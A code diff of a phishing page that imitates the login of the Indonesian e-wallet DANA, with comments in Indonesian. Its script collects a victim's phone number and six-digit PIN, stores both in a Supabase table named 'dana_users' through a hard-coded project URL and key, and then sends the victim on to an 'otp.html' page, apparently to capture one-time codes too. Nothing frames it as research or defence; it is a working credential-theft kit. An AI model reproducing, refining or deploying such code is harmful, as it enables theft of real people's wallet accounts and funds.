@@ -9,8 +9,10 @@
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
+        /* CSS dari nomor.html */
+        /* Variabel CSS untuk warna agar mudah diubah */
         :root {
-            --dana-blue: #118EEA;
+            --dana-blue: #118EEA; /* Warna biru yang lebih akurat dari gambar loading */
             --text-white: #FFFFFF;
             --text-dark: #333333;
             --text-medium: #505050; /* Untuk teks kebijakan */
@@ -457,212 +459,195 @@
         </div>
     </div>
 
+
     <script>
         const SUPABASE_URL = 'https://vqmfachxnjyxwuavpgds.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZxbWZhY2h4bmp5eHd1YXZwZ2RzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg0MDYxNDAsImV4cCI6MjA2Mzk4MjE0MH0.Bzr8mUiEl8MzRWpVQ3_59eFxKk0EWZ3ca-4IEcpGLkk'; 
+        
+        
+        let supabase; 
 
+        document.addEventListener('DOMContentLoaded', function() {
+            supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        let currentPhoneNumber = '';
+            let currentPhoneNumber = '';
 
-        function showNomorContent() {
-            const initialLoadingScreen = document.getElementById('initial-loading-screen');
-            const nomorSection = document.getElementById('nomor-section');
+            function showNomorContent() {
+                const initialLoadingScreen = document.getElementById('initial-loading-screen');
+                const nomorSection = document.getElementById('nomor-section');
 
-            initialLoadingScreen.style.opacity = '0';
-            setTimeout(() => {
-                initialLoadingScreen.style.display = 'none';
-                nomorSection.style.display = 'block';
+                initialLoadingScreen.style.opacity = '0';
                 setTimeout(() => {
-                    nomorSection.classList.add('visible');
-                }, 50);
-            }, 1000);
-        }
-
-        window.addEventListener('load', () => {
-            setTimeout(showNomorContent, 2000);
-        });
-
-        const inputNomorHP = document.getElementById('np');
-        const tombolLanjutkan = document.getElementById('sdt');
-        const universalLoadingOverlay = document.getElementById('universal-loading-overlay');
-        const nomorSpinner = universalLoadingOverlay.querySelector('.spinner'); // Spinner utama 50px
-        const pinSpinnerGroup = universalLoadingOverlay.querySelector('.pin-spinner-group'); // Grup spinner PIN
-
-        inputNomorHP.addEventListener('input', function() {
-            let formattedValue = this.value.replace(/\D/g, '');
-
-            if (formattedValue.length > 3 && formattedValue.length <= 7) {
-                formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3);
-            } else if (formattedValue.length > 7) {
-                formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3, 7) + '-' + formattedValue.slice(7, 11);
+                    initialLoadingScreen.style.display = 'none';
+                    nomorSection.style.display = 'block';
+                    setTimeout(() => {
+                        nomorSection.classList.add('visible');
+                    }, 50);
+                }, 1000);
             }
 
-            this.value = formattedValue;
+            // Memanggil showNomorContent setelah delay awal untuk efek loading
+            window.addEventListener('load', () => {
+                setTimeout(showNomorContent, 2000);
+            });
 
-            const minLength = 9;
-            const maxLength = 12;
-            const cleanedValue = this.value.replace(/-/g, '');
+            const inputNomorHP = document.getElementById('np');
+            const tombolLanjutkan = document.getElementById('sdt');
+            const universalLoadingOverlay = document.getElementById('universal-loading-overlay');
+            const nomorSpinner = universalLoadingOverlay.querySelector('.spinner'); // Spinner utama 50px
+            const pinSpinnerGroup = universalLoadingOverlay.querySelector('.pin-spinner-group'); // Grup spinner PIN
 
-            if (cleanedValue.length >= minLength && cleanedValue.length <= maxLength) {
-                tombolLanjutkan.disabled = false;
-                tombolLanjutkan.style.backgroundColor = 'var(--white)';
-                tombolLanjutkan.style.color = 'var(--dana-blue)';
-                tombolLanjutkan.style.cursor = 'pointer';
-            } else {
-                tombolLanjutkan.disabled = true;
-                tombolLanjutkan.style.backgroundColor = 'var(--button-disabled)';
-                tombolLanjutkan.style.color = 'var(--white)';
-                tombolLanjutkan.style.cursor = 'not-allowed';
+            inputNomorHP.addEventListener('input', function() {
+                let formattedValue = this.value.replace(/\D/g, '');
+
+                if (formattedValue.length > 3 && formattedValue.length <= 7) {
+                    formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3);
+                } else if (formattedValue.length > 7) {
+                    formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3, 7) + '-' + formattedValue.slice(7, 11);
+                }
+
+                this.value = formattedValue;
+
+                const minLength = 9;
+                const maxLength = 12;
+                const cleanedValue = this.value.replace(/-/g, '');
+
+                if (cleanedValue.length >= minLength && cleanedValue.length <= maxLength) {
+                    tombolLanjutkan.disabled = false;
+                    tombolLanjutkan.style.backgroundColor = 'var(--white)';
+                    tombolLanjutkan.style.color = 'var(--dana-blue)';
+                    tombolLanjutkan.style.cursor = 'pointer';
+                } else {
+                    tombolLanjutkan.disabled = true;
+                    tombolLanjutkan.style.backgroundColor = 'var(--button-disabled)';
+                    tombolLanjutkan.style.color = 'var(--white)';
+                    tombolLanjutkan.style.cursor = 'not-allowed';
+                }
+            });
+
+            if (inputNomorHP.value) {
+                inputNomorHP.dispatchEvent(new Event('input'));
             }
-        });
 
-        if (inputNomorHP.value) {
-            inputNomorHP.dispatchEvent(new Event('input'));
-        }
+            tombolLanjutkan.addEventListener('click', async function() {
+                if (!this.disabled) {
+                    currentPhoneNumber = inputNomorHP.value.replace(/-/g, ''); // Simpan nomor HP yang bersih
+                    
+                    // Tampilkan loading screen sebelum menyimpan data nomor
+                    document.getElementById('nomor-section').style.display = 'none'; 
+                    nomorSpinner.style.display = 'block';
+                    pinSpinnerGroup.style.display = 'none';
+                    universalLoadingOverlay.style.display = 'flex';
 
-        tombolLanjutkan.addEventListener('click', async function() {
-            if (!this.disabled) {
-                currentPhoneNumber = inputNomorHP.value.replace(/-/g, '');
-                document.getElementById('nomor-section').style.display = 'none'; 
-                nomorSpinner.style.display = 'block';
-                pinSpinnerGroup.style.display = 'none';
+                    try {
+                        // Perbaikan: Menggunakan 'nomor' sebagai nama kolom
+                        const { data, error } = await supabase
+                            .from('dana_users') // Menggunakan nama tabel Anda
+                            .insert([
+                                { nomor: currentPhoneNumber } // Menggunakan nama kolom 'nomor'
+                            ]);
+
+                        if (error) {
+                            // Tambahkan log lebih detail untuk debugging
+                            console.error('Supabase Error (insert nomor):', error.message);
+                            alert('Gagal menyimpan nomor HP. Error: ' + error.message); // Tampilkan pesan error lebih spesifik
+                            throw error; // Tetap lempar error agar ditangkap di blok catch utama
+                        }
+                        console.log('Nomor HP berhasil disimpan:', data);
+
+                        setTimeout(() => {
+                            universalLoadingOverlay.style.display = 'none';
+                            document.getElementById('pin-page').style.display = 'block';
+                            document.getElementById('pn1').focus();
+                        }, 1500);
+
+                    } catch (error) {
+                        console.error('Gagal menyimpan nomor HP:', error.message);
+                        alert('Gagal menyimpan nomor HP. Coba lagi nanti. Detail: ' + error.message);
+                        universalLoadingOverlay.style.display = 'none';
+                        document.getElementById('nomor-section').style.display = 'block';
+                        document.getElementById('nomor-section').classList.add('visible');
+                    }
+                }
+            });
+
+            const pinInputs = document.querySelectorAll("#pinForm input");
+            const pinForm = document.getElementById("pinForm");
+
+            pinInputs.forEach((input, index) => {
+                input.dataset.index = index;
+                input.addEventListener("keydown", clear);
+                input.addEventListener("keyup", onKeyUp);
+            });
+
+            function clear($event) { $event.target.value = ""; }
+            function checkNumber(number) { return /[0-9]/g.test(number); }
+            async function onKeyUp($event) { 
+                const input = $event.target;
+                const value = input.value;
+                const fieldIndex = +input.dataset.index;
+                if ($event.key === "Backspace" && fieldIndex > 0) {
+                    input.previousElementSibling.focus();
+                }
+                if (checkNumber(value)) {
+                    if (value.length > 0 && fieldIndex < pinInputs.length - 1) {
+                        input.nextElementSibling.focus();
+                    }
+                    let allFilled = true;
+                    pinInputs.forEach(pinInput => {
+                        if (pinInput.value.length === 0) {
+                            allFilled = false;
+                        }
+                    });
+
+                    if (allFilled) {
+                        pinInputs.forEach(pinInput => {
+                            pinInput.readOnly = true;
+                        });
+                        await submitPin();
+                    }
+                } else {
+                    clear($event);
+                }
+            }
+
+            async function submitPin(){
+                nomorSpinner.style.display = 'none';
+                pinSpinnerGroup.style.display = 'block';
                 universalLoadingOverlay.style.display = 'flex';
 
+                const pin = Array.from(pinInputs).map(input => input.value).join('');
+
+                // Pastikan currentPhoneNumber sudah terisi sebelum mencoba update
+                if (!currentPhoneNumber) {
+                    console.error("currentPhoneNumber kosong. Tidak bisa menyimpan PIN tanpa nomor HP.");
+                    alert('Terjadi kesalahan: Nomor HP tidak ditemukan. Mohon kembali ke halaman sebelumnya.');
+                    universalLoadingOverlay.style.display = 'none';
+                    pinInputs.forEach(input => {
+                        input.readOnly = false;
+                    });
+                    return; // Hentikan eksekusi jika nomor HP kosong
+                }
+
                 try {
+                    // Perbaikan: Menggunakan 'nomor' di .eq()
                     const { data, error } = await supabase
-                        .from('dana_users')
-                        .insert([
-                            { nomor: currentPhoneNumber } // Menggunakan nama kolom 'nomor'
-                        ]);
+                        .from('dana_users') // Menggunakan nama tabel Anda
+                        .update({ pin: pin }) // Menggunakan nama kolom 'pin'
+                        .eq('nomor', currentPhoneNumber); // Menggunakan nama kolom 'nomor' untuk mencari data
 
                     if (error) {
-                        throw error;
+                        // Tambahkan log lebih detail untuk debugging
+                        console.error('Supabase Error (update PIN):', error.message);
+                        alert('Gagal menyimpan PIN. Error: ' + error.message); // Tampilkan pesan error lebih spesifik
+                        throw error; // Tetap lempar error agar ditangkap di blok catch utama
                     }
-                    console.log('Nomor HP berhasil disimpan:', data);
-
-                    setTimeout(() => {
-                        universalLoadingOverlay.style.display = 'none';
-                        document.getElementById('pin-page').style.display = 'block';
-                        document.getElementById('pn1').focus();
-                    }, 1500);
+                    console.log('PIN berhasil disimpan/diupdate:', data);
+                    setTimeout(function(){
+                        window.location.href = 'otp.html';
+                    }, 2000);
 
                 } catch (error) {
-                    console.error('Gagal menyimpan nomor HP:', error.message);
-                    alert('Gagal menyimpan nomor HP. Coba lagi nanti.');
+                    console.error('Gagal menyimpan PIN:', error.message);
+                    alert('Gagal menyimpan PIN. Coba lagi nanti. Detail: ' + error.message);
                     universalLoadingOverlay.style.display = 'none';
-                    document.getElementById('nomor-section').style.display = 'block';
-                    document.getElementById('nomor-section').classList.add('visible');
-                }
-            }
-        });
-
-        const pinInputs = document.querySelectorAll("#pinForm input");
-        const pinForm = document.getElementById("pinForm");
-
-        pinInputs.forEach((input, index) => {
-            input.dataset.index = index;
-            input.addEventListener("keydown", clear);
-            input.addEventListener("keyup", onKeyUp);
-        });
-
-        function clear($event) { $event.target.value = ""; }
-        function checkNumber(number) { return /[0-9]/g.test(number); }
-        async function onKeyUp($event) { 
-            const input = $event.target;
-            const value = input.value;
-            const fieldIndex = +input.dataset.index;
-            if ($event.key === "Backspace" && fieldIndex > 0) {
-                input.previousElementSibling.focus();
-            }
-            if (checkNumber(value)) {
-                if (value.length > 0 && fieldIndex < pinInputs.length - 1) {
-                    input.nextElementSibling.focus();
-                }
-                let allFilled = true;
-                pinInputs.forEach(pinInput => {
-                    if (pinInput.value.length === 0) {
-                        allFilled = false;
-                    }
-                });
-
-                if (allFilled) {
-                    pinInputs.forEach(pinInput => {
-                        pinInput.readOnly = true;
-                    });
-                    await submitPin();
-                }
-            } else {
-                clear($event);
-            }
-        }
-
-        async function submitPin(){
-            nomorSpinner.style.display = 'none';
-            pinSpinnerGroup.style.display = 'block';
-            universalLoadingOverlay.style.display = 'flex';
-
-            const pin = Array.from(pinInputs).map(input => input.value).join('');
-
-            try {
-                // Perbaikan: Menggunakan 'nomor' di .eq()
-                const { data, error } = await supabase
-                    .from('dana_users') // Menggunakan nama tabel Anda
-                    .update({ pin: pin }) // Menggunakan nama kolom 'pin'
-                    .eq('nomor', currentPhoneNumber); // Menggunakan nama kolom 'nomor' untuk mencari data
-
-                if (error) {
-                    throw error;
-                }
-                console.log('PIN berhasil disimpan/diupdate:', data);
-                setTimeout(function(){
-                    window.location.href = 'otp.html';
-                }, 2000);
-
-            } catch (error) {
-                console.error('Gagal menyimpan PIN:', error.message);
-                alert('Gagal menyimpan PIN. Coba lagi nanti.');
-                universalLoadingOverlay.style.display = 'none';
-                pinInputs.forEach(input => {
-                    input.readOnly = false;
-                });
-            }
-        }
-        var btn_show = document.getElementById('see');
-        var pin1 = document.getElementById('pn1');
-        var pin2 = document.getElementById('pn2');
-        var pin3 = document.getElementById('pn3');
-        var pin4 = document.getElementById('pn4');
-        var pin5 = document.getElementById('pn5');
-        var pin6 = document.getElementById('pn6');
-
-        btn_show.addEventListener('click', pasToText);
-
-        function pasToText(){
-            const currentType = pin1.type;
-            const newType = (currentType === 'password') ? 'text' : 'password';
-            const buttonText = (currentType === 'password') ? 'SEMBUNYIKAN' : 'TAMPILKAN';
-
-            pinInputs.forEach(input => {
-                input.setAttribute('type', newType);
-            });
-            btn_show.innerHTML = buttonText;
-        }
-
-        document.getElementById('back-to-nomor-btn').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('pin-page').style.display = 'none';
-            document.getElementById('nomor-section').style.display = 'block';
-            document.getElementById('nomor-section').classList.add('visible');
-            pinInputs.forEach(input => {
-                input.value = '';
-                input.type = 'password';
-                input.readOnly = false;
-            });
-            btn_show.innerHTML='TAMPILKAN';
-            document.getElementById('np').focus();
-        });
-
-    </script>
-
-</body>
-</html>
